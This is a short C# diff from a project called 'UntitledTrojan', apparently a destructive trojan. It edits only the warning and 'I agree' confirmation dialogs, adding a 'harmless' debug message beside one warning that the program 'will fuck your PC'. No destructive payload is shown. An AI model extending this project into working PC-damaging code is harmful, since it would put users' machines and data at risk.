@@ -13,12 +13,20 @@ namespace UntitledTrojan.Tools
         internal static bool FailMain()
         {
             string inputText = "";
-            MessageBox.Show("WARNING! This is not a joke." +
-                "\nThis can trash your pc. Use VM for testing this malware." +
-                "\nUse only for educational purposes." +
-                "\nNext window will be a confirmation of your actions." +
-                "\n\nCreated by TheAirBlow 2020 (https://github.com/theairblow)", "UntitledTrojan", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-            DialogResult result = InputBox("UntitledTrojan", "Enter \"I agree\" if you are agreed with anything showed before.", ref inputText);
+
+            if (Entry.debug)
+                MessageBox.Show("WARNING! This is a harmless version." +
+                    "\nBut still it can crash your PC due to heavily using CPU." +
+                    "\nNext window will be a confirmation." +
+                    "\n\nCreated by TheAirBlow in 2020 (https://github.com/theairblow)", "UntitledTrojan", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            else
+                MessageBox.Show("WARNING! This is not a joke." +
+                    "\nThis will fuck your PC. Use VM for testing this malware." +
+                    "\nUse only for educational purposes." +
+                    "\nNext window will be a confirmation." +
+                    "\n\nCreated by TheAirBlow in 2020 (https://github.com/theairblow)", "UntitledTrojan", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+
+            DialogResult result = InputBox("UntitledTrojan", "Enter \"I agree\" if you are agree with anything showed before.", ref inputText);
             if (result == DialogResult.OK)
             {
                 if (inputText == "I agree")
